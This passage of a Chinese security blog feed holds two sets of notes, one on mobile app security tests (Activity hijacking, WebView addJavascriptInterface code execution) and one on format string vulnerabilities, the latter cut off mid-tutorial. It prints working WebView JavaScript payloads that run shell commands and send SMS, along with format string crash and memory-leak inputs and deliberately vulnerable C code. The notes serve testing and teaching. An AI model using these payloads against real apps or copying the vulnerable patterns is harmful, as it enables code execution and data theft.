alt=""><br>选择已有的证书：<br><img src="http://148.70.228.11/upload/11b0665c67728f3e40e7192a879b1cce.png" alt=""></li><li>数字证书创建或选择完成后，点击OK—–&gt;点击Next——&gt;Finish。<br>注意：生成后的数字证书千万不能丢失，还有密码也不能忘记了。因为这些东西对app以后的版本升级至关重要</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://source.android.com/security/apksigning/v2" target="_blank" rel="noopener">https://source.android.com/security/apksigning/v2</a><br><a href="https://blog.csdn.net/qq309909897/article/details/72234968" target="_blank" rel="noopener">https://blog.csdn.net/qq309909897/article/details/72234968</a></p><hr><h2 id="Activity劫持"><a href="#Activity劫持" class="headerlink" title="Activity劫持"></a>Activity劫持</h2><h3 id="检测目的-1"><a href="#检测目的-1" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测应用登录Activity组件是否可被劫持。攻击者可以在本地监听用户的状态，当用户登陆或者输入交易密码时，弹出伪造的界面诱骗用户输入正确的账号口令，从而窃取用户信息。</p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol><li>编写并安装恶意APP，针对目标测试APP进行Activity拦截。</li><li>开启拦截后，打开目标APP，弹出拦截页面后，查看原测试APP是否存在相关的弹窗或提醒，告诉用户APP已进入后台。</li></ol><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>这个问题无法从根本上解决，一般方法是在Activity被顶替时，显示提醒消息来警示用户。<br><code>https://github.com/1van/ActivityHijacker</code><br>这个项目里写了通用的方法：<br><img src="http://148.70.228.11/upload/2afc60fa3b2f29c3df5c54e5e44ff73f.png" alt=""></p><h3 id="相关背景-1"><a href="#相关背景-1" class="headerlink" title="相关背景"></a>相关背景</h3><p><strong>Activity劫持</strong>，就是APP正常的Activity界面被恶意攻击APP的界面顶替，以仿冒的钓鱼Activity界面骗取用户的信息。举个例子来说，当用户打开安卓手机上的某一应用，进入到登陆页面，这时，恶意软件侦测到用户的这一动作，立即弹出一个与该应用界面相同的Activity，覆盖掉了合法的Activity，骗取用户的账号密码。</p><p>Activity劫持漏洞的根本原因是：</p><ol><li>Android系统提供给了所有APP应用无需权限声明，<strong>枚举当前运行进程的API</strong>。</li><li>Android系统的Activity调度系统AmS（ActivityManagerService）使用栈结构来调度Activity,会展示栈顶的Activity界面。而任意APP或Service,都可以在启动一个Activity时，设置标志位FLAG_ACTIVITY_NEW_TASK，将这个Activity置于栈顶，覆盖掉展示的界面。</li></ol><p>由上可见，此漏洞的产生原因是Android系统本身提供了所有APP这样做的能力，故根本无法从根本上防御。恶意APP程序，可以注册1个开机自启的后台service, 不断轮询当前的运行进程，当发现目标APP启动时，就启动1个仿冒的钓鱼Activity覆盖掉当前Activity，劫持了目标APP的界面。</p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/1van/ActivityHijacker" target="_blank" rel="noopener">https://github.com/1van/ActivityHijacker</a></p><hr><h2 id="WebView命令执行漏洞-addJavascriptInterface"><a href="#WebView命令执行漏洞-addJavascriptInterface" class="headerlink" title="WebView命令执行漏洞 - addJavascriptInterface"></a>WebView命令执行漏洞 - addJavascriptInterface</h2><h3 id="检测目的-2"><a href="#检测目的-2" class="headerlink" title="检测目的"></a>检测目的</h3><p> WebView组件存在严重的命令执行漏洞。当WebView中使用了addJavascriptInterface()接口时，远程攻击者可在恶意页面中调用Java Reflection API来执行任意Java对象的方法，执行任意命令。该漏洞影响Android API level 16以及之前的版本（即Android 4.2之前的系统）</p><h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><p>劫持APP发出的HTTP请求，在返回的HTML中加入Webview的测试元素，或使用检测的HTML直接替代返回的HTML数据。</p><h3 id="检测详情-1"><a href="#检测详情-1" class="headerlink" title="检测详情"></a>检测详情</h3><p>Webview命令执行的测试HTML为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;WebView Test&lt;/title&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, </span><br><span class="line">user-scalable=0&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;If the application has the webview vulnerability, then the vulnerable interfaces </span><br><span class="line">will be shown below.!!&lt;/b&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function check()&#123;</span><br><span class="line">  for (var obj in window)&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      if (&quot;getClass&quot; in window[obj]) &#123;</span><br><span class="line">         try&#123;</span><br><span class="line">            window[obj].getClass();</span><br><span class="line">            document.write(&apos;&lt;span </span><br><span class="line">style=&quot;color:red&quot;&gt;&apos;+obj+&apos;&lt;/span&gt;&apos;);                              </span><br><span class="line">            document.write(&apos;&lt;br /&gt;&apos;);</span><br><span class="line">         &#125;catch(e)&#123; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch(e) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line">check();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>遍历所有的HTML元素，寻找是否存在可利用的Webview接口。</p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>Android 4.2版本号之后</strong><br>Google 在Android 4.2 版本号中规定对被调用的函数以 @JavascriptInterface进行注解从而避免漏洞攻击，用 @JavascriptInterface  代替addjavascriptInterface</p><p><strong>Android 4.2版本号之前</strong><br>修改调用方式，利用prompt<br>详情参考：</p><blockquote><p><a href="https://blog.csdn.net/xyz_lmn/article/details/39399225/" target="_blank" rel="noopener">https://blog.csdn.net/xyz_lmn/article/details/39399225/</a><br><a href="https://www.cnblogs.com/jhcelue/p/7338791.html" target="_blank" rel="noopener">https://www.cnblogs.com/jhcelue/p/7338791.html</a></p></blockquote><h3 id="相关背景-2"><a href="#相关背景-2" class="headerlink" title="相关背景"></a>相关背景</h3><p>WebView组件允许WebView中加载的JS文件，通过addJavascriptIntetface的接口来映射对象，调用APP中的方法。</p><p>addJavascriptInterface:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(new JSObject(), &quot;myObj&quot;);</span><br><span class="line">// 參数1：Android的本地对象</span><br><span class="line">// 參数2：JS的对象</span><br><span class="line">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span><br></pre></td></tr></table></figure></p><p>若App的代码中使用了webView.addJavascriptInterface绑定了js对象和java对象，则当webview中加载的Js用到这个对象时，就能够调用这个对象中所有的方法，包括系统类（java.lang.Runtime类）的方法，从而实现任意代码执行。</p><p>具体流程为：</p><ol><li>Js调用addJavascriptInterface绑定的对象（”myObj”）</li><li>调用所有对象都有的公共反射方法:getClass()，获取当前类</li><li>利用反射调用forName(“java.lang.Runtime”)，得到Runtime类</li><li>再用反射getMethod想要调用的方法，用invode调用，exec执行。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function execute(cmdArgs)  </span><br><span class="line">&#123;</span><br><span class="line">// 步骤1：遍历 window 对象</span><br><span class="line">// 目的是为了找到包含 getClass （）的对象</span><br><span class="line">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span><br><span class="line">for (var obj in window) &#123;  </span><br><span class="line">    if (&quot;getClass&quot; in window[obj]) &#123;  </span><br><span class="line">    // 步骤2：利用反射调用forName（）得到Runtime类对象</span><br><span class="line">    // 步骤3：以后，就能够调用静态方法来运行一些命令。比方訪问文件的命令</span><br><span class="line">         alert(obj);                                        </span><br><span class="line">         return window[obj].getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line">    // 从运行命令后返回的输入流中得到字符串。有非常严重暴露隐私的危急。</span><br><span class="line">    // 如运行完訪问文件的命令之后，就能够得到文件名称的信息了。</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;&#125;</span><br><span class="line">var res = execute([&quot;/system/bin/sh&quot;, &quot;-c&quot;, &quot;ls -al /mnt/sdcard/&quot;]);</span><br><span class="line">document.write(getContents(res.getInputStream()));</span><br></pre></td></tr></table></figure><p>当一些 APP 通过扫描二维码打开一个外部网页， 或诱使受害者打开恶意网页、浏览恶意微博或者向受害者发送恶意邮件，攻击者就能够运行这段 js 代码进行漏洞攻击。</p><p>利用此漏洞也可以执行其他的操作，如发短信：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var objSmsManager =     injectedObj.getClass().forName(&quot;android.telephony.SmsManager&quot;).getM ethod(&quot;getDefault&quot;,null).invoke(null,null);</span><br><span class="line">    objSmsManager.sendTextMessage(&quot;10086&quot;,null,&quot;this message is sent by JS when webview is loading&quot;,null,null);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>还可以利用此漏洞给系统装上恶意APP、挂马、反弹shell、执行ELF等。</p><h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/jhcelue/p/7338791.html" target="_blank" rel="noopener">https://www.cnblogs.com/jhcelue/p/7338791.html</a><br><a href="https://blog.csdn.net/feizhixuan46789/article/details/49155369" target="_blank" rel="noopener">https://blog.csdn.net/feizhixuan46789/article/details/49155369</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：&lt;br&gt;在公司时，会接到很多APP的测试项目，其中就包括移动端安全的基本测试。由于本人对移动端安全没有很多的研究，在单独做这些项目时会遇到很多的困难，所以专门总结了这篇文章，&lt;strong&gt;以供自己测试需要&lt;/strong&gt;。大佬请提出建议或
      
    
    </summary>
    
      <category term="移动安全" scheme="http://fanxs-t.github.io/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="整理笔记" scheme="http://fanxs-t.github.io/tags/%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Android" scheme="http://fanxs-t.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>【整理笔记】格式化字符串漏洞梳理</title>
    <link href="http://fanxs-t.github.io/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/"/>
    <id>http://fanxs-t.github.io/2018/10/23/【整理笔记】格式化字符串漏洞梳理/</id>
    <published>2018-10-23T08:18:10.000Z</published>
    <updated>2019-07-23T06:23:42.272Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>前言：</strong><br>格式化字符串漏洞是比较古老的漏洞了，已经被研究了好多年，在目前广泛的ASLR和vsprintf/vprintf等新函数的保护下，这个漏洞也已经不常见。写这个只是因为，在之前读书时，专门读了这个漏洞的文章，想想当时学的那么认真，没有做啥整理就忘光了有点可惜，所以就重新复习了一下做一下学习整理。</p></blockquote><h1 id="0-简介"><a href="#0-简介" class="headerlink" title="0. 简介"></a>0. 简介</h1><p>格式化字符串漏洞是广泛存在于基于C/C++的可执行文件中的漏洞，于2000年被纰漏。这个漏洞是典型的二进制常见漏洞之一，它的危害甚至超过了缓冲区溢出。</p><h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h1><p>格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。</p><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p><strong>格式化字符串漏洞</strong>，简单说，就是：如果一个攻击者能给<strong>格式化函数</strong>提供恶意编造的<strong>格式化字符串</strong>，那么这里就可能存在格式化字符串漏洞。攻击者能通过这个漏洞，改变格式化函数的行为，甚至可能控制整个目标可执行文件。</p><p>在下面的这个程序中，字符串user是可由攻击者提供的，他能控制提供给printf函数的所有参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int func(char *user)&#123;</span><br><span class="line">printf(user);               // 存在格式化字符串漏洞</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实现同样功能的，安全代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int func(char *user)&#123;</span><br><span class="line">printf(“%s”,user);   // 用户无法控制格式化字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="1-2-格式化函数一览"><a href="#1-2-格式化函数一览" class="headerlink" title="1.2 格式化函数一览"></a>1.2 格式化函数一览</h2><p>格式化字符串漏洞出现于格式化函数中。</p><p>下面列举了一些ANSI C 标准中定义的一系列格式化函数。还有一些常见的却不在ANSI C标准中定义的函数，因为他们基于这些ANSI C定义的格式化函数，所有也可能受格式化字符串漏洞的影响。</p><table><thead><tr><th>格式化函数名</th><th>功能</th><th>安全代码例子</th></tr></thead><tbody><tr><td>fprintf</td><td>输出到file流</td><td>fprintf(pFile, “UserId = %d”, userId);</td></tr><tr><td>printf</td><td>输出到stdout流</td><td>printf(“userId=%d”,userId);</td></tr><tr><td>sprintf</td><td>输出到字符串中</td><td>sprintf(buffer, ”userId=%d”, userId);</td></tr><tr><td>snprintf</td><td>输出到字符串中（长度控制）</td><td>snprintf ( buffer, 100, “userId=%d”, userId);</td></tr><tr><td>vfprintf</td><td>输出到file流（从va_arg结构体）</td><td>vfprintf (stream, format, args);</td></tr><tr><td>vprintf</td><td>输出到stdout流（从va_arg结构体）</td><td>vprintf (format, args);</td></tr><tr><td>vsprintf</td><td>输出到字符串中（从va_arg结构体）</td><td>vsprintf (buffer,format, args);</td></tr><tr><td>vsnprintf</td><td>输出到字符串中（长度控制，从va_arg结构体）</td><td>vsnprintf (buffer,256,format, args);</td></tr><tr><td><strong>相关的函数</strong></td><td></td><td></td></tr><tr><td>setproctitile</td><td>设置argv[]</td><td>/</td></tr><tr><td>syslog</td><td>输出到syslog功能</td><td>/</td></tr><tr><td>其他如err<em>,verr</em>,warn<em>,vwarn</em></td><td>/</td><td>/</td></tr></tbody></table><ul><li>同样用于输出的puts(),fputs()等函数，非格式化函数。放入格式化参数，将直接打印出来。<br><img src="http://148.70.228.11/gs1.png" alt=""></li></ul><h2 id="1-3-格式化函数的用处"><a href="#1-3-格式化函数的用处" class="headerlink" title="1.3 格式化函数的用处"></a>1.3 格式化函数的用处</h2><p>格式化字符串漏洞几乎出现所有的C程序中，是因为格式化函数的用处是如此的常见和重要。格式化函数常用于提供以下的功能：<br>    •   将简单的C语言数据类型转换为字符串的表现形式<br>    •   定义数据的展示格式<br>    •   处理结果字符串（输出道stderr,stdout,syslog等）</p><p>格式化函数工作方式为：<br>    •   格式化字符串控制了格式化函数的功能<br>    •   定义了输出数据中的参数数据类型<br>    •   函数参数保存在栈中<br>    •   参数传递方式为传值或传引用</p><p>调用格式化函数的程序：<br>    •   必须要知道要在栈中传递多少个参数。（为了在格式化函数返回时修正栈位置）</p><h2 id="1-4-格式化字符串是啥"><a href="#1-4-格式化字符串是啥" class="headerlink" title="1.4 格式化字符串是啥"></a>1.4 格式化字符串是啥</h2><p>格式化字符串是一种包含了文字和格式参数的特殊的ASCIIZ字符串。<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;The magic number is: %d\n&quot;, 1911);    // 第一个参数的字符串就是格式化字符串</span><br></pre></td></tr></table></figure></p><p>这里的%d为格式参数。</p><p>以下列出了一些用到的格式参数：</p><table><thead><tr><th>参数</th><th>输出</th><th>参数传递方式</th><th>示例</th></tr></thead><tbody><tr><td>%d</td><td>十进制数字</td><td>传值</td><td>printf(“%d”, 1);</td></tr><tr><td>%u</td><td>无符号十进制数字</td><td>传值</td><td>printf(“%u”, 1);</td></tr><tr><td>%x</td><td>十六进制数字</td><td>传值</td><td>printf(“%x”, 0x123);</td></tr><tr><td>%c</td><td>单个字符</td><td>传值</td><td>printf(“%c”, “a”);</td></tr><tr><td>%s</td><td>字符串</td><td>传引用</td><td>printf(“%s”, string);</td></tr><tr><td>%n</td><td>已输出的字节数(DWORD)</td><td>传引用</td><td>printf(“%n”, &amp;i);</td></tr><tr><td>%hn</td><td>已输出的字节数(WORD)</td><td>传引用</td><td>printf(“%hn”, &amp;i);</td></tr><tr><td>%p</td><td>按地址长度十六进制输出数据</td><td>传值</td><td>printf(“%p”, ptr);</td></tr></tbody></table><p><strong>Note</strong>:<br>特殊的参数： %n$, 用于指以固定格式输出的第n个数。<br>( 如 %5$x，指用十六进制输出的第5个数。程序会直接读到第5个位置，不会影响读取的地址，即:<br>printf(“%08x-%08x-%5$x-%08x”)，会打出1-2-5-3位置的数据 )</p><h2 id="1-5-栈布局"><a href="#1-5-栈布局" class="headerlink" title="1.5 栈布局"></a>1.5 栈布局</h2><p>格式化函数从栈中取出格式化字符串所要的数据，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);</span><br></pre></td></tr></table></figure></p><p>这时的栈布局是这样的：<br><img src="http://148.70.228.11/gs37.png" alt=""></p><p>具体例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;       // 地址 0xdeadbeef</span><br><span class="line">int i = 11;</span><br><span class="line">printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);      // 格式化字符串地址0xaabbccdd</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/gs3.png" alt=""></p><ol><li>格式化函数（printf）读取参数格式化字符串，一个字符一个字符地读取。如果读到的字符不为%，则将字符复制到输出数据。若读到的字符为%，则后一个字符设定了请求参数的类型（%d数字，%c字符…），函数根据数据类型，去栈上取相关的值，复制到输出数据。%%用于打印字符’%’。一直读到0x00，视作格式化字符串结束。</li><li>函数读到了第一个格式参数%d，取出栈上的下一个数据（11），复制到输出数据。</li><li>函数读到了第二个格式参数%d，取出栈上的下一个数据（10），复制到输出数据。</li><li>函数读到了第三个格式参数%08x，取出来栈上的下一个数据（0xdeedbeef），复制到输出数据。</li></ol><p>这里三个格式参数都是以传值的方式来传递数据。若函数读到了%s和%n，则会去访问引用的地址，取出引用数据的值。</p><p>当程序员由于偷懒或疏忽，没有严格按照格式化函数的形参标准去调用格式化函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如 printf(user);  // 而不是printf(“%s”,user)</span><br></pre></td></tr></table></figure></p><p>就造成攻击者能输入恶意数据，放入栈中，被格式化函数认为是合理的格式化字符串。</p><p><strong>Note</strong>:</p><ol><li><p>编译器无法判断代码合法性。printf等格式化函数经常是参数长度可变的函数，因此仅仅看参数数量，编译器无法判断其合法性。<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(“Hello World”);</span><br><span class="line">printf(“Hello World%s”, input);</span><br><span class="line">printf(output, “Hello World%s”,input);</span><br><span class="line">printf(output, “Hello World%s:%d”,input，num);</span><br><span class="line">……</span><br><span class="line">都是可行的。</span><br></pre></td></tr></table></figure></li><li><p>printf函数本身无法检测到问题。函数直接从栈上或寄存器中获得函数参数，它并不知道调用者提供了多少个参数。</p></li></ol><h2 id="1-6-总结"><a href="#1-6-总结" class="headerlink" title="1.6 总结"></a>1.6 总结</h2><p>所谓的格式化字符串漏洞，要点有二:</p><ol><li>程序中存在格式化函数。</li><li>程序员的疏忽造成攻击者能直接控制格式化字符串。</li></ol><h1 id="2-漏洞危害和利用方法"><a href="#2-漏洞危害和利用方法" class="headerlink" title="2. 漏洞危害和利用方法"></a>2. 漏洞危害和利用方法</h1><p>这里再强调一遍这个漏洞的秘诀：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串控制着格式化函数的行为。</span><br></pre></td></tr></table></figure></p><p>以下写了这个漏洞能造成的危害，以及利用手法。这一章所有的攻击，都以printf函数为例子。</p><h2 id="2-1-让程序崩溃"><a href="#2-1-让程序崩溃" class="headerlink" title="2.1 让程序崩溃"></a>2.1 让程序崩溃</h2><p>一个最简单的应用，就是让程序恶意崩溃。攻击者可利用以下的payload例子来引起崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);</span><br></pre></td></tr></table></figure></p><p>攻击者伪造格式化字符串”%s%s%s%s%s%s%s%s%s%s%s%s” 作为输入数据。这时printf读到这个格式化字符串，会连续12次从栈中取数据作引用地址，访问地址取出数据。如果程序访问到非法地址，就会触发崩溃。</p><p>在所有UNIX系统中，内核会捕捉进程的非法指针访问，并对进程发出SIGSEGV信号终止程序。<br><img src="http://148.70.228.11/gs4.png" alt=""><br>可见返回了Segmentation Fault(SIGEGV)错误，最后的“Ending”语句没有被打印出来。</p><h2 id="2-2-查看栈数据"><a href="#2-2-查看栈数据" class="headerlink" title="2.2 查看栈数据"></a>2.2 查看栈数据</h2><p>访问栈内容，直接让printf输出内存数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);</span><br></pre></td></tr></table></figure></p><p>payload获取栈里接下来的5个数据，以8位16进制的形式输出。<br><img src="http://148.70.228.11/gs5.png" alt=""></p><p>这里输出了一部分的栈数据，从当前栈位置到栈顶。栈数据的泄露可以提供很多关于程序流程和局部函数变量的信息，可能能帮助攻击者得到下一步攻击的相关偏移量或数据。</p><p><strong>实验</strong>：<br>C程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">int a[8]=&#123;43690,43690,43690,43690,43690,43690,43690,43690&#125;;</span><br><span class="line">char *message = &quot;%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x\n&quot;;</span><br><span class="line">printf(message);</span><br><span class="line">printf(&quot;Ending&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用gcc编译成32位的后，在GDB中执行。在程序调用printf前打断点，查看内存的数据：<br><img src="http://148.70.228.11/gs6.png" alt=""><br>可以明显看到打出来的栈数据中有我们定义的数组：<br><img src="http://148.70.228.11/gs7.png" alt=""><br>（0x0000aaaa = 43690）</p><p>而栈顶0x565556d0则指向了格式化字符串：<br><img src="http://148.70.228.11/gs8.png" alt=""><br>25-30-38-78-38 即为%0x8,</p><p>运行后，可看到程序输出了栈中的数据，造成了栈中数据的泄露：<br><img src="http://148.70.228.11/gs9.png" alt=""></p><p><strong>Note</strong>:<br>若程序被编译为64位，输出数据时会跳着读取内存，至今不知为何：<br><img src="http://148.70.228.11/gs10.png" alt=""></p><h2 id="2-3-查看任何位置的内存数据"><a href="#2-3-查看任何位置的内存数据" class="headerlink" title="2.3 查看任何位置的内存数据"></a>2.3 查看任何位置的内存数据</h2><p>既然可以利用漏洞去读栈数据了，那下一步要思考的，就是是否能利用漏洞来读取任意内存地址的数据。要做到这一点，我们需要提供一个内存地址，让格式化字符串函数去访问地址。</p><p>现在我们有两个问题：</p><ol><li>需要一个格式化参数，去获取对应地址的数据。</li><li>需要一个方法，提供内存地址给格式化函数。</li></ol><p>从之前的漏洞利用中，我们就知道可以利用”%s”格式化参数来获取对应地址的数据。现在第一个问题解决了，剩下的就是怎么将一个内存地址，放在正确的位置，让格式化函数读取。</p><p>在很多时候，用户输入的数据本身就在栈上。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">int a[8]=&#123;43690,43690,43690,43690,43690,43690,43690,43690&#125;;</span><br><span class="line">char message[150];</span><br><span class="line">scanf(&quot;%s&quot;, message);</span><br><span class="line">printf(message);</span><br><span class="line">printf(&quot;Ending&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序先从用户中获得输入的数据，放到message变量中，再调用printf。可见message数据就在栈中。<br><img src="http://148.70.228.11/gs11.png" alt=""><br>攻击者可通过类似的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%s</span><br></pre></td></tr></table></figure></p><p>若%08x的个数恰当，就能在正好读到message缓冲区时，让%s取到message开头的”AAAAAAAA“地址，以此输出”AAAAAAAA”地址的对应数值。也可以使用AAAAAAAA%12$s。</p><p><strong>实验：</strong><br>运行程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">int a[8]=&#123;43690,43690,43690,43690,43690,43690,43690,43690&#125;;</span><br><span class="line">char message[150];</span><br><span class="line">print(&quot;Input:\n&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, message);</span><br><span class="line">printf(&quot;Result:\n&quot;);</span><br><span class="line">printf(message);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x</span><br></pre></td></tr></table></figure></p><p>可见：<br><img 